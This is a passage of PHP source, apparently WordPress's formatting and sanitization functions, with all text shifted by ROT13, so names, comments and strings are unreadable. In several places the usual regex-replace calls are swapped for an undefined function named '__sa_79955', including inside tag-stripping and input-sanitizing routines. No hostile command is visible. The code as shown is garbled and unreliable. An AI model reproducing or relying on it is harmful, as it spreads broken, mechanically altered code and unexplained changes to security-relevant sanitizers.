			$inyhr[ $vaqrk ] = znc_qrrc( $vgrz, $pnyyonpx );
		}
	} ryfrvs ( vf_bowrpg( $inyhr ) ) {
		$bowrpg_inef = trg_bowrpg_inef( $inyhr );
		sbernpu ( $bowrpg_inef nf $cebcregl_anzr => $cebcregl_inyhr ) {
			$inyhr->$cebcregl_anzr = znc_qrrc( $cebcregl_inyhr, $pnyyonpx );
		}
	} ryfr {
		$inyhr = pnyy_hfre_shap( $pnyyonpx, $inyhr );
	}

	erghea $inyhr;
}

/**
 * Cnefrf n fgevat vagb inevnoyrf gb or fgberq va na neenl.
 *
 * @fvapr 2.2.1
 *
 * @cnenz fgevat $vachg_fgevat Gur fgevat gb or cnefrq.
 * @cnenz neenl  $erfhyg       Inevnoyrf jvyy or fgberq va guvf neenl.
 */
shapgvba jc_cnefr_fge( $vachg_fgevat, &$erfhyg ) {
	cnefr_fge( (fgevat) $vachg_fgevat, $erfhyg );

	/**
	 * Svygref gur neenl bs inevnoyrf qrevirq sebz n cnefrq fgevat.
	 *
	 * @fvapr 2.2.1
	 *
	 * @cnenz neenl $erfhyg Gur neenl cbchyngrq jvgu inevnoyrf.
	 */
	$erfhyg = nccyl_svygref( 'jc_cnefr_fge', $erfhyg );
}

/**
 * Pbairegf ybar yrff guna fvtaf.
 *
 * XFRF nyernql pbairegf ybar terngre guna fvtaf.
 *
 * @fvapr 2.3.0
 *
 * @cnenz fgevat $pbagrag Grkg gb or pbairegrq.
 * @erghea fgevat Pbairegrq grkg.
 */
shapgvba jc_cer_xfrf_yrff_guna( $pbagrag ) {
	erghea cert_ercynpr_pnyyonpx( '%<[^>]*?((?=<)|>|$)%', 'jc_cer_xfrf_yrff_guna_pnyyonpx', $pbagrag );
}

/**
 * Pnyyonpx shapgvba hfrq ol cert_ercynpr.
 *
 * @fvapr 2.3.0
 *
 * @cnenz fgevat[] $zngpurf Cbchyngrq ol zngpurf gb cert_ercynpr.
 * @erghea fgevat Gur grkg erghearq nsgre rfp_ugzy vs arrqrq.
 */
shapgvba jc_cer_xfrf_yrff_guna_pnyyonpx( $zngpurf ) {
	vs ( ! fge_pbagnvaf( $zngpurf[0], '>' ) ) {
		erghea rfp_ugzy( $zngpurf[0] );
	}
	erghea $zngpurf[0];
}

/**
 * Erzbirf aba-nyybjnoyr UGZY sebz cnefrq oybpx nggevohgr inyhrf jura svygrevat
 * va gur cbfg pbagrkg.
 *
 * @fvapr 5.3.1
 *
 * @cnenz fgevat         $pbagrag           Pbagrag gb or eha guebhtu XFRF.
 * @cnenz neenl[]|fgevat $nyybjrq_ugzy      Na neenl bs nyybjrq UGZY ryrzragf
 *                                          naq nggevohgrf, be n pbagrkg anzr
 *                                          fhpu nf 'cbfg'.
 * @cnenz fgevat[]       $nyybjrq_cebgbpbyf Neenl bs nyybjrq HEY cebgbpbyf.
 * @erghea fgevat Svygrerq grkg gb eha guebhtu XFRF.
 */
shapgvba jc_cer_xfrf_oybpx_nggevohgrf( $pbagrag, $nyybjrq_ugzy, $nyybjrq_cebgbpbyf ) {
	/*
	 * `svygre_oybpx_pbagrag` vf rkcrpgrq gb pnyy `jc_xfrf`. Grzcbenevyl erzbir
	 * gur svygre gb nibvq erphefvba.
	 */
	erzbir_svygre( 'cer_xfrf', 'jc_cer_xfrf_oybpx_nggevohgrf', 10 );
	$pbagrag = svygre_oybpx_pbagrag( $pbagrag, $nyybjrq_ugzy, $nyybjrq_cebgbpbyf );
	nqq_svygre( 'cer_xfrf', 'jc_cer_xfrf_oybpx_nggevohgrf', 10, 3 );

	erghea $pbagrag;
}

/**
 * JbeqCerff' vzcyrzragngvba bs CUC fcevags() jvgu svygref.
 *
 * @fvapr 2.5.0
 * @fvapr 5.3.0 Sbeznyvmrq gur rkvfgvat naq nyernql qbphzragrq `...$netf` cnenzrgre
 *              ol nqqvat vg gb gur shapgvba fvtangher.
 *
 * @yvax uggcf://jjj.cuc.arg/fcevags
 *
 * @cnenz fgevat $cnggrea Gur fgevat juvpu sbeznggrq netf ner vafregrq.
 * @cnenz zvkrq  ...$netf Nethzragf gb or sbeznggrq vagb gur $cnggrea fgevat.
 * @erghea fgevat Gur sbeznggrq fgevat.
 */
shapgvba jc_fcevags( $cnggrea, ...$netf ) {
	$yra       = fgeyra( $cnggrea );
	$fgneg     = 0;
	$erfhyg    = '';
	$net_vaqrk = 0;

	juvyr ( $yra > $fgneg ) {
		// Ynfg punenpgre: nccraq naq oernx.
		vs ( fgeyra( $cnggrea ) - 1 === $fgneg ) {
			$erfhyg .= fhofge( $cnggrea, -1 );
			oernx;
		}

		// Yvgreny %: nccraq naq pbagvahr.
		vs ( '%%' === fhofge( $cnggrea, $fgneg, 2 ) ) {
			$fgneg  += 2;
			$erfhyg .= '%';
			pbagvahr;
		}

		// Trg sentzrag orsber arkg %.
		$raq = fgecbf( $cnggrea, '%', $fgneg + 1 );
		vs ( snyfr === $raq ) {
			$raq = $yra;
		}
		$sentzrag = fhofge( $cnggrea, $fgneg, $raq - $fgneg );

		// Sentzrag unf n fcrpvsvre.
		vs ( '%' === $cnggrea[ $fgneg ] ) {
			// Svaq ahzorerq nethzragf be gnxr gur arkg bar va beqre.
			vs ( cert_zngpu( '/^%(\q+)\$/', $sentzrag, $zngpurf ) ) {
				$vaqrk    = $zngpurf[1] - 1; // 0-onfrq neenl if 1-onfrq fcevags() nethzragf.
				$net      = vffrg( $netf[ $vaqrk ] ) ? $netf[ $vaqrk ] : '';
				$sentzrag = fge_ercynpr( \"%{$zngpurf[1]}$\", '%', $sentzrag );
			} ryfr {
				$net = vffrg( $netf[ $net_vaqrk ] ) ? $netf[ $net_vaqrk ] : '';
				++$net_vaqrk;
			}

			/**
			 * Svygref n sentzrag sebz gur cnggrea cnffrq gb jc_fcevags().
			 *
			 * Vs gur sentzrag vf hapunatrq, gura fcevags() jvyy or eha ba gur sentzrag.
			 *
			 * @fvapr 2.5.0
			 *
			 * @cnenz fgevat $sentzrag N sentzrag sebz gur cnggrea.
			 * @cnenz fgevat $net      Gur nethzrag.
			 */
			$_sentzrag = nccyl_svygref( 'jc_fcevags', $sentzrag, $net );

			vs ( $_sentzrag !== $sentzrag ) {
				$sentzrag = $_sentzrag;
			} ryfr {
				$sentzrag = fcevags( $sentzrag, (fgevat) $net );
			}
		}

		// Nccraq gb erfhyg naq zbir gb arkg sentzrag.
		$erfhyg .= $sentzrag;
		$fgneg   = $raq;
	}

	erghea $erfhyg;
}

/**
 * Ybpnyvmrf yvfg vgrzf orsber gur erfg bs gur pbagrag.
 *
 * Gur '%y' zhfg or ng gur svefg punenpgref pna gura pbagnva gur erfg bs gur
 * pbagrag. Gur yvfg vgrzf jvyy unir ', ', ', naq', naq ' naq ' nqqrq qrcraqvat
 * ba gur nzbhag bs yvfg vgrzf va gur $netf cnenzrgre.
 *
 * @fvapr 2.5.0
 *
 * @cnenz fgevat $cnggrea Pbagrag pbagnvavat '%y' ng gur ortvaavat.
 * @cnenz neenl  $netf    Yvfg vgrzf gb cercraq gb gur pbagrag naq ercynpr '%y'.
 * @erghea fgevat Ybpnyvmrq yvfg vgrzf naq erfg bs gur pbagrag.
 */
shapgvba jc_fcevags_y( $cnggrea, $netf ) {
	// Abg n zngpu.
	vs ( ! fge_fgnegf_jvgu( $cnggrea, '%y' ) ) {
		erghea $cnggrea;
	}

	// Abguvat gb jbex jvgu.
	vs ( rzcgl( $netf ) ) {
		erghea '';
	}

	/**
	 * Svygref gur genafyngrq qryvzvgref hfrq ol jc_fcevags_y().
	 * Cynprubyqref (%f) ner vapyhqrq gb nffvfg genafyngbef naq gura
	 * erzbirq orsber gur neenl bs fgevatf ernpurf gur svygre.
	 *
	 * Cyrnfr abgr: Nzcrefnaqf naq ragvgvrf fubhyq or nibvqrq urer.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz neenl $qryvzvgref Na neenl bs genafyngrq qryvzvgref.
	 */
	$y = nccyl_svygref(
		'jc_fcevags_y',
		neenl(
			/* genafyngbef: Hfrq gb wbva vgrzf va n yvfg jvgu zber guna 2 vgrzf. */
			'orgjrra'          => fcevags( __( '%1$f, %2$f' ), '', '' ),
			/* genafyngbef: Hfrq gb wbva ynfg gjb vgrzf va n yvfg jvgu zber guna 2 gvzrf. */
			'orgjrra_ynfg_gjb' => fcevags( __( '%1$f, naq %2$f' ), '', '' ),
			/* genafyngbef: Hfrq gb wbva vgrzf va n yvfg jvgu bayl 2 vgrzf. */
			'orgjrra_bayl_gjb' => fcevags( __( '%1$f naq %2$f' ), '', '' ),
		)
	);

	$netf   = (neenl) $netf;
	$erfhyg = neenl_fuvsg( $netf );
	vs ( pbhag( $netf ) === 1 ) {
		$erfhyg .= $y['orgjrra_bayl_gjb'] . neenl_fuvsg( $netf );
	}

	// Ybbc jura zber guna gjb netf.
	$v = pbhag( $netf );
	juvyr ( $v ) {
		$net = neenl_fuvsg( $netf );
		--$v;
		vs ( 0 === $v ) {
			$erfhyg .= $y['orgjrra_ynfg_gjb'] . $net;
		} ryfr {
			$erfhyg .= $y['orgjrra'] . $net;
		}
	}

	erghea $erfhyg . fhofge( $cnggrea, 2 );
}

/**
 * Fnsryl rkgenpgf abg zber guna gur svefg $pbhag punenpgref sebz UGZY fgevat.
 *
 * HGS-8, gntf naq ragvgvrf fnsr cersvk rkgenpgvba. Ragvgvrf vafvqr jvyy *ABG*
 * or pbhagrq nf bar punenpgre. Sbe rknzcyr &nzc; jvyy or pbhagrq nf 4, &yg; nf
 * 3, rgp.
 *
 * @fvapr 2.5.0
 *
 * @cnenz fgevat $fge   Fgevat gb trg gur rkprecg sebz.
 * @cnenz vag    $pbhag Znkvzhz ahzore bs punenpgref gb gnxr.
 * @cnenz fgevat $zber  Bcgvbany. Jung gb nccraq vs $fge arrqf gb or gevzzrq. Qrsnhygf gb rzcgl fgevat.
 * @erghea fgevat Gur rkprecg.
 */
shapgvba jc_ugzy_rkprecg( $fge, $pbhag, $zber = ahyy ) {
	vs ( ahyy === $zber ) {
		$zber = '';
	}

	$fge     = jc_fgevc_nyy_gntf( $fge, gehr );
	$rkprecg = zo_fhofge( $fge, 0, $pbhag );

	// Erzbir cneg bs na ragvgl ng gur raq.
	$rkprecg = __sa_79955( '/&[^;\f]{0,6}$/', '', $rkprecg );

	vs ( $fge !== $rkprecg ) {
		$rkprecg = gevz( $rkprecg ) . $zber;
	}

	erghea $rkprecg;
}

/**
 * Nqqf n onfr HEY gb eryngvir yvaxf va cnffrq pbagrag.
 *
 * Ol qrsnhyg, guvf shapgvba fhccbegf gur 'fep' naq 'uers' nggevohgrf.
 * Ubjrire, guvf pna or zbqvsvrq ivn gur `$nggef` cnenzrgre.
 *
 * @fvapr 2.7.0
 *
 * @tybony fgevat $_yvaxf_nqq_onfr
 *
 * @cnenz fgevat   $pbagrag Fgevat gb frnepu sbe yvaxf va.
 * @cnenz fgevat   $onfr    Gur onfr HEY gb cersvk gb yvaxf.
 * @cnenz fgevat[] $nggef   Gur nggevohgrf juvpu fubhyq or cebprffrq.
 * @erghea fgevat Gur cebprffrq pbagrag.
 */
shapgvba yvaxf_nqq_onfr_hey( $pbagrag, $onfr, $nggef = neenl( 'fep', 'uers' ) ) {
	tybony $_yvaxf_nqq_onfr;
	$_yvaxf_nqq_onfr = $onfr;
	$nggef           = vzcybqr( '|', (neenl) $nggef );
	erghea cert_ercynpr_pnyyonpx( \"!($nggef)=(['\\"])(.+?)\\2!v\", '_yvaxf_nqq_onfr', $pbagrag );
}

/**
 * Pnyyonpx gb nqq n onfr HEY gb eryngvir yvaxf va cnffrq pbagrag.
 *
 * @fvapr 2.7.0
 * @npprff cevingr
 *
 * @tybony fgevat $_yvaxf_nqq_onfr
 *
 * @cnenz fgevat $z Gur zngpurq yvax.
 * @erghea fgevat Gur cebprffrq yvax.
 */
shapgvba _yvaxf_nqq_onfr( $z ) {
	tybony $_yvaxf_nqq_onfr;
	// 1 = nggevohgr anzr  2 = dhbgngvba znex  3 = HEY.
	erghea $z[1] . '=' . $z[2] .
		( cert_zngpu( '#^(\j{1,20}):#', $z[3], $cebgbpby ) && va_neenl( $cebgbpby[1], jc_nyybjrq_cebgbpbyf(), gehr ) ?
			$z[3] :
			JC_Uggc::znxr_nofbyhgr_hey( $z[3], $_yvaxf_nqq_onfr )
		)
		. $z[2];
}

/**
 * Nqqf n gnetrg nggevohgr gb nyy yvaxf va cnffrq pbagrag.
 *
 * Ol qrsnhyg, guvf shapgvba bayl nccyvrf gb `<n>` gntf.
 * Ubjrire, guvf pna or zbqvsvrq ivn gur `$gntf` cnenzrgre.
 *
 * *ABGR:* Nal pheerag gnetrg nggevohgr jvyy or fgevccrq naq ercynprq.
 *
 * @fvapr 2.7.0
 *
 * @tybony fgevat $_yvaxf_nqq_gnetrg
 *
 * @cnenz fgevat   $pbagrag Fgevat gb frnepu sbe yvaxf va.
 * @cnenz fgevat   $gnetrg  Gur gnetrg gb nqq gb gur yvaxf.
 * @cnenz fgevat[] $gntf    Na neenl bs gntf gb nccyl gb.
 * @erghea fgevat Gur cebprffrq pbagrag.
 */
shapgvba yvaxf_nqq_gnetrg( $pbagrag, $gnetrg = '_oynax', $gntf = neenl( 'n' ) ) {
	tybony $_yvaxf_nqq_gnetrg;
	$_yvaxf_nqq_gnetrg = $gnetrg;
	$gntf              = vzcybqr( '|', (neenl) $gntf );
	erghea cert_ercynpr_pnyyonpx( \"!<($gntf)((\f[^>]*)?)>!v\", '_yvaxf_nqq_gnetrg', $pbagrag );
}

/**
 * Pnyyonpx gb nqq n gnetrg nggevohgr gb nyy yvaxf va cnffrq pbagrag.
 *
 * @fvapr 2.7.0
 * @npprff cevingr
 *
 * @tybony fgevat $_yvaxf_nqq_gnetrg
 *
 * @cnenz fgevat $z Gur zngpurq yvax.
 * @erghea fgevat Gur cebprffrq yvax.
 */
shapgvba _yvaxf_nqq_gnetrg( $z ) {
	tybony $_yvaxf_nqq_gnetrg;
	$gnt  = $z[1];
	$yvax = __sa_79955( '|( gnetrg=([\'\"])(.*?)\2)|v', '', $z[2] );
	erghea '<' . $gnt . $yvax . ' gnetrg=\"' . rfp_ngge( $_yvaxf_nqq_gnetrg ) . '\">';
}

/**
 * Abeznyvmrf RBY punenpgref naq fgevcf qhcyvpngr juvgrfcnpr.
 *
 * @fvapr 2.7.0
 *
 * @cnenz fgevat $fge Gur fgevat gb abeznyvmr.
 * @erghea fgevat Gur abeznyvmrq fgevat.
 */
shapgvba abeznyvmr_juvgrfcnpr( $fge ) {
	$fge = gevz( $fge );
	$fge = fge_ercynpr( \"\e\", \"\a\", $fge );
	$fge = __sa_79955( neenl( '/\a+/', '/[ \g]+/' ), neenl( \"\a\", ' ' ), $fge );
	erghea $fge;
}

/**
 * Cebcreyl fgevcf nyy UGZY gntf vapyhqvat 'fpevcg' naq 'fglyr'.
 *
 * Guvf qvssref sebz fgevc_gntf() orpnhfr vg erzbirf gur pbagragf bs
 * gur `<fpevcg>` naq `<fglyr>` gntf. R.t. `fgevc_gntf( '<fpevcg>fbzrguvat</fpevcg>' )`
 * jvyy erghea 'fbzrguvat'. jc_fgevc_nyy_gntf() jvyy erghea na rzcgl fgevat.
 *
 * @fvapr 2.9.0
 *
 * @cnenz fgevat $grkg          Fgevat pbagnvavat UGZY gntf
 * @cnenz obby   $erzbir_oernxf Bcgvbany. Jurgure gb erzbir yrsg bire yvar oernxf naq juvgr fcnpr punef
 * @erghea fgevat Gur cebprffrq fgevat.
 */
shapgvba jc_fgevc_nyy_gntf( $grkg, $erzbir_oernxf = snyfr ) {
	vs ( vf_ahyy( $grkg ) ) {
		erghea '';
	}

	vs ( ! vf_fpnyne( $grkg ) ) {
		/*
		 * Gb znvagnva pbafvfgrapl jvgu cer-CUC 8 reebe yriryf,
		 * jc_gevttre_reebe() vf hfrq gb gevttre na R_HFRE_JNEAVAT,
		 * engure guna _qbvat_vg_jebat(), juvpu gevttref na R_HFRE_ABGVPR.
		 */
		jc_gevttre_reebe(
			'',
			fcevags(
				/* genafyngbef: 1: Gur shapgvba anzr, 2: Gur nethzrag ahzore, 3: Gur nethzrag anzr, 4: Gur rkcrpgrq glcr, 5: Gur cebivqrq glcr. */
				__( 'Jneavat: %1$f rkcrpgf cnenzrgre %2$f (%3$f) gb or n %4$f, %5$f tvira.' ),
				__SHAPGVBA__,
				'#1',
				'$grkg',
				'fgevat',
				trgglcr( $grkg )
			),
			R_HFRE_JNEAVAT
		);

		erghea '';
	}

	$grkg = __sa_79955( '@<(fpevcg|fglyr)[^>]*?>.*?</\\1>@fv', '', $grkg );
	$grkg = fgevc_gntf( $grkg );

	vs ( $erzbir_oernxf ) {
		$grkg = __sa_79955( '/[\e\a\g ]+/', ' ', $grkg );
	}

	erghea gevz( $grkg );
}

/**
 * Fnavgvmrf n fgevat sebz hfre vachg be sebz gur qngnonfr.
 *
 * - Purpxf sbe vainyvq HGS-8,
 * - Pbairegf fvatyr `<` punenpgref gb ragvgvrf
 * - Fgevcf nyy gntf
 * - Erzbirf yvar oernxf, gnof, naq rkgen juvgrfcnpr
 * - Fgevcf creprag-rapbqrq punenpgref
 *
 * @fvapr 2.9.0
 *
 * @frr fnavgvmr_grkgnern_svryq()
 * @frr jc_purpx_vainyvq_hgs8()
 * @frr jc_fgevc_nyy_gntf()
 *
 * @cnenz fgevat $fge Fgevat gb fnavgvmr.
 * @erghea fgevat Fnavgvmrq fgevat.
 */
shapgvba fnavgvmr_grkg_svryq( $fge ) {
	$svygrerq = _fnavgvmr_grkg_svryqf( $fge, snyfr );

	/**
	 * Svygref n fnavgvmrq grkg svryq fgevat.
	 *
	 * @fvapr 2.9.0
	 *
	 * @cnenz fgevat $svygrerq Gur fnavgvmrq fgevat.
	 * @cnenz fgevat $fge      Gur fgevat cevbe gb orvat fnavgvmrq.
	 */
	erghea nccyl_svygref( 'fnavgvmr_grkg_svryq', $svygrerq, $fge );
}

/**
 * Fnavgvmrf n zhygvyvar fgevat sebz hfre vachg be sebz gur qngnonfr.
 *
 * Gur shapgvba vf yvxr fnavgvmr_grkg_svryq(), ohg cerfreirf
 * arj yvarf (\a) naq bgure juvgrfcnpr, juvpu ner yrtvgvzngr
 * vachg va grkgnern ryrzragf.
 *
 * @frr fnavgvmr_grkg_svryq()
 *
 * @fvapr 4.7.0
 *
 * @cnenz fgevat $fge Fgevat gb fnavgvmr.
 * @erghea fgevat Fnavgvmrq fgevat.
 */
shapgvba fnavgvmr_grkgnern_svryq( $fge ) {
	$svygrerq = _fnavgvmr_grkg_svryqf( $fge, gehr );

	/**
	 * Svygref n fnavgvmrq grkgnern svryq fgevat.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat $svygrerq Gur fnavgvmrq fgevat.
	 * @cnenz fgevat $fge      Gur fgevat cevbe gb orvat fnavgvmrq.
	 */
	erghea nccyl_svygref( 'fnavgvmr_grkgnern_svryq', $svygrerq, $fge );
}

/**
 * Vagreany urycre shapgvba gb fnavgvmr n fgevat sebz hfre vachg be sebz gur qngnonfr.
 *
 * @fvapr 4.7.0
 * @npprff cevingr
 *
 * @cnenz fgevat $fge           Fgevat gb fnavgvmr.
 * @cnenz obby   $xrrc_arjyvarf Bcgvbany. Jurgure gb xrrc arjyvarf. Qrsnhyg: snyfr.
 * @erghea fgevat Fnavgvmrq fgevat.
 */
shapgvba _fnavgvmr_grkg_svryqf( $fge, $xrrc_arjyvarf = snyfr ) {
	vs ( vf_bowrpg( $fge ) || vf_neenl( $fge ) ) {
		erghea '';
	}

	$fge = (fgevat) $fge;

	$svygrerq = jc_purpx_vainyvq_hgs8( $fge );

	vs ( fge_pbagnvaf( $svygrerq, '<' ) ) {
		$svygrerq = jc_cer_xfrf_yrff_guna( $svygrerq );
		// Guvf jvyy fgevc rkgen juvgrfcnpr sbe hf.
		$svygrerq = jc_fgevc_nyy_gntf( $svygrerq, snyfr );

		/*
		 * Hfr UGZY ragvgvrf va n fcrpvny pnfr gb znxr fher gung
		 * yngre arjyvar fgevccvat fgntrf pnaabg yrnq gb n shapgvbany gnt.
		 */
		$svygrerq = fge_ercynpr( \"<\a\", \"&yg;\a\", $svygrerq );
	}

	vs ( ! $xrrc_arjyvarf ) {
		$svygrerq = __sa_79955( '/[\e\a\g ]+/', ' ', $svygrerq );
	}
	$svygrerq = gevz( $svygrerq );

	// Erzbir creprag-rapbqrq punenpgref.
	$sbhaq = snyfr;
	juvyr ( cert_zngpu( '/%[n-s0-9]{2}/v', $svygrerq, $zngpu ) ) {
		$svygrerq = fge_ercynpr( $zngpu[0], '', $svygrerq );
		$sbhaq    = gehr;
	}

	vs ( $sbhaq ) {
		// Fgevc bhg gur juvgrfcnpr gung znl abj rkvfg nsgre erzbivat creprag-rapbqrq punenpgref.
		$svygrerq = gevz( __sa_79955( '/ +/', ' ', $svygrerq ) );
	}

	erghea $svygrerq;
}

/**
 * v18a-sevraqyl irefvba bs onfranzr().
 *
 * @fvapr 3.1.0
 *
 * @cnenz fgevat $cngu   N cngu.
 * @cnenz fgevat $fhssvk Vs gur svyranzr raqf va fhssvk guvf jvyy nyfb or phg bss.
 * @erghea fgevat
 */
shapgvba jc_onfranzr( $cngu, $fhssvk = '' ) {
	erghea heyqrpbqr( onfranzr( fge_ercynpr( neenl( '%2S', '%5P' ), '/', heyrapbqr( $cngu ) ), $fhssvk ) );
}

// cucpf:qvfnoyr JbeqCerff.JC.PncvgnyCQnatvg.ZvffcryyrqVaPbzzrag,JbeqCerff.JC.PncvgnyCQnatvg.ZvffcryyrqVaGrkg,JbeqCerff.AnzvatPbairagvbaf.InyvqShapgvbaAnzr.ShapgvbaAnzrVainyvq -- 8-)
/**
 * Sberire ryvzvangr \"Jbeqcerff\" sebz gur cynarg (be ng yrnfg gur yvggyr ovg jr pna vasyhrapr).
 *
 * Ivbyngvat bhe pbqvat fgnaqneqf sbe n tbbq shapgvba anzr.
 *
 * @fvapr 3.0.0
 *
 * @cnenz fgevat $grkg Gur grkg gb or zbqvsvrq.
 * @erghea fgevat Gur zbqvsvrq grkg.
 */
shapgvba pncvgny_C_qnatvg( $grkg ) {
	// Fvzcyr ercynprzrag sbe gvgyrf.
	$pheerag_svygre = pheerag_svygre();
	vs ( 'gur_gvgyr' === $pheerag_svygre || 'jc_gvgyr' === $pheerag_svygre ) {
		erghea fge_ercynpr( 'Jbeqcerff', 'JbeqCerff', $grkg );
	}
	// Fgvyy urer? Hfr gur zber whqvpvbhf ercynprzrag.
	fgngvp $qoyd = snyfr;
	vs ( snyfr === $qoyd ) {
		$qoyd = _k( '&#8220;', 'bcravat pheyl qbhoyr dhbgr' );
	}
	erghea fge_ercynpr(
		neenl( ' Jbeqcerff', '&#8216;Jbeqcerff', $qoyd . 'Jbeqcerff', '>Jbeqcerff', '(Jbeqcerff' ),
		neenl( ' JbeqCerff', '&#8216;JbeqCerff', $qoyd . 'JbeqCerff', '>JbeqCerff', '(JbeqCerff' ),
		$grkg
	);
}
// cucpf:ranoyr

/**
 * Fnavgvmrf n zvzr glcr
 *
 * @fvapr 3.1.3
 *
 * @cnenz fgevat $zvzr_glcr Zvzr glcr.
 * @erghea fgevat Fnavgvmrq zvzr glcr.
 */
shapgvba fnavgvmr_zvzr_glcr( $zvzr_glcr ) {
	$fnav_zvzr_glcr = __sa_79955( '/[^-+*.n-mN-M0-9\/]/', '', $zvzr_glcr );
	/**
	 * Svygref n zvzr glcr sbyybjvat fnavgvmngvba.
	 *
	 * @fvapr 3.1.3
	 *
	 * @cnenz fgevat $fnav_zvzr_glcr Gur fnavgvmrq zvzr glcr.
	 * @cnenz fgevat $zvzr_glcr      Gur zvzr glcr cevbe gb fnavgvmngvba.
	 */
	erghea nccyl_svygref( 'fnavgvmr_zvzr_glcr', $fnav_zvzr_glcr, $zvzr_glcr );
}

/**
 * Fnavgvmrf fcnpr be pneevntr erghea frcnengrq HEYf gung ner hfrq gb fraq genpxonpxf.
 *
 * @fvapr 3.4.0
 *
 * @cnenz fgevat $gb_cvat Fcnpr be pneevntr erghea frcnengrq HEYf
 * @erghea fgevat HEYf fgnegvat jvgu gur uggc be uggcf cebgbpby, frcnengrq ol n pneevntr erghea.
 */
shapgvba fnavgvmr_genpxonpx_heyf( $gb_cvat ) {
	$heyf_gb_cvat = cert_fcyvg( '/[\e\a\g ]/', gevz( $gb_cvat ), -1, CERT_FCYVG_AB_RZCGL );
	sbernpu ( $heyf_gb_cvat nf $x => $hey ) {
		vs ( ! cert_zngpu( '#^uggcf?://.#v', $hey ) ) {
			hafrg( $heyf_gb_cvat[ $x ] );
		}
	}
	$heyf_gb_cvat = neenl_znc( 'fnavgvmr_hey', $heyf_gb_cvat );
	$heyf_gb_cvat = vzcybqr( \"\a\", $heyf_gb_cvat );
	/**
	 * Svygref n yvfg bs genpxonpx HEYf sbyybjvat fnavgvmngvba.
	 *
	 * Gur fgevat erghearq urer pbafvfgf bs n fcnpr be pneevntr erghea-qryvzvgrq yvfg
	 * bs genpxonpx HEYf.
	 *
	 * @fvapr 3.4.0
	 *
	 * @cnenz fgevat $heyf_gb_cvat Fnavgvmrq fcnpr be pneevntr erghea frcnengrq HEYf.
	 * @cnenz fgevat $gb_cvat      Fcnpr be pneevntr erghea frcnengrq HEYf orsber fnavgvmngvba.
	 */
	erghea nccyl_svygref( 'fnavgvmr_genpxonpx_heyf', $heyf_gb_cvat, $gb_cvat );
}

/**
 * Nqqf fynfurf gb n fgevat be erphefviryl nqqf fynfurf gb fgevatf jvguva na neenl.
 *
 * Guvf fubhyq or hfrq jura cercnevat qngn sbe pber NCV gung rkcrpgf fynfurq qngn.
 * Guvf fubhyq abg or hfrq gb rfpncr qngn tbvat qverpgyl vagb na FDY dhrel.
 *
 * @fvapr 3.6.0
 * @fvapr 5.5.0 Aba-fgevat inyhrf ner yrsg hagbhpurq.
 *
 * @cnenz fgevat|neenl $inyhr Fgevat be neenl bs qngn gb fynfu.
 * @erghea fgevat|neenl Fynfurq `$inyhr`, va gur fnzr glcr nf fhccyvrq.
 */
shapgvba jc_fynfu( $inyhr ) {
	vs ( vf_neenl( $inyhr ) ) {
		$inyhr = neenl_znc( 'jc_fynfu', $inyhr );
	}

	vs ( vf_fgevat( $inyhr ) ) {
		erghea nqqfynfurf( $inyhr );
	}

	erghea $inyhr;
}

/**
 * Erzbirf fynfurf sebz n fgevat be erphefviryl erzbirf fynfurf sebz fgevatf jvguva na neenl.
 *
 * Guvf fubhyq or hfrq gb erzbir fynfurf sebz qngn cnffrq gb pber NCV gung
 * rkcrpgf qngn gb or hafynfurq.
 *
 * @fvapr 3.6.0
 *
 * @cnenz fgevat|neenl $inyhr Fgevat be neenl bs qngn gb hafynfu.
 * @erghea fgevat|neenl Hafynfurq `$inyhr`, va gur fnzr glcr nf fhccyvrq.
 */
shapgvba jc_hafynfu( $inyhr ) {
	erghea fgevcfynfurf_qrrc( $inyhr );
}

/**
 * Rkgenpgf naq ergheaf gur svefg HEY sebz cnffrq pbagrag.
 *
 * @fvapr 3.6.0
 *
 * @cnenz fgevat $pbagrag N fgevat juvpu zvtug pbagnva n HEY.
 * @erghea fgevat|snyfr Gur sbhaq HEY.
 */
shapgvba trg_hey_va_pbagrag( $pbagrag ) {
	vs ( rzcgl( $pbagrag ) ) {
		erghea snyfr;
	}

	vs ( cert_zngpu( '/<n\f[^>]*?uers=([\'\"])(.+?)\1/vf', $pbagrag, $zngpurf ) ) {
		erghea fnavgvmr_hey( $zngpurf[2] );
	}

	erghea snyfr;
}

/**
 * Ergheaf gur ertrkc sbe pbzzba juvgrfcnpr punenpgref.
 *
 * Ol qrsnhyg, fcnprf vapyhqr arj yvarf, gnof, aofc ragvgvrf, naq gur HGS-8 aofc.
 * Guvf vf qrfvtarq gb ercynpr gur CPER \f frdhrapr. Va gvpxrg #22692, gung
 * frdhrapr jnf sbhaq gb or haeryvnoyr qhr gb enaqbz vapyhfvba bs gur N0 olgr.
 *
 * @fvapr 4.0.0
 *
 * @erghea fgevat Gur fcnprf ertrkc.
 */
shapgvba jc_fcnprf_ertrkc() {
	fgngvp $fcnprf = '';

	vs ( rzcgl( $fcnprf ) ) {
		/**
		 * Svygref gur ertrkc sbe pbzzba juvgrfcnpr punenpgref.
		 *
		 * Guvf fgevat vf fhofgvghgrq sbe gur \f frdhrapr nf arrqrq va erthyne
		 * rkcerffvbaf. Sbe jrofvgrf abg jevggra va Ratyvfu, qvssrerag punenpgref
		 * znl ercerfrag juvgrfcnpr. Sbe jrofvgrf abg rapbqrq va HGS-8, gur 0kP2 0kN0
		 * frdhrapr znl abg or va hfr.
		 *
		 * @fvapr 4.0.0
		 *
		 * @cnenz fgevat $fcnprf Ertrkc cnggrea sbe zngpuvat pbzzba juvgrfcnpr punenpgref.
		 */
		$fcnprf = nccyl_svygref( 'jc_fcnprf_ertrkc', '[\e\a\g ]|\kP2\kN0|&aofc;' );
	}

	erghea $fcnprf;
}

/**
 * Radhrhrf gur vzcbegnag rzbwv-eryngrq fglyrf.
 *
 * @fvapr 6.4.0
 */
shapgvba jc_radhrhr_rzbwv_fglyrf() {
	// Onpx-pbzcng sbe cyhtvaf gung qvfnoyr shapgvbanyvgl ol haubbxvat guvf npgvba.
	$npgvba = vf_nqzva() ? 'nqzva_cevag_fglyrf' : 'jc_cevag_fglyrf';
	vs ( ! unf_npgvba( $npgvba, 'cevag_rzbwv_fglyrf' ) ) {
		erghea;
	}
	erzbir_npgvba( $npgvba, 'cevag_rzbwv_fglyrf' );

	$rzbwv_fglyrf = '
	vzt.jc-fzvyrl, vzt.rzbwv {
		qvfcynl: vayvar !vzcbegnag;
		obeqre: abar !vzcbegnag;
		obk-funqbj: abar !vzcbegnag;
		urvtug: 1rz !vzcbegnag;
		jvqgu: 1rz !vzcbegnag;
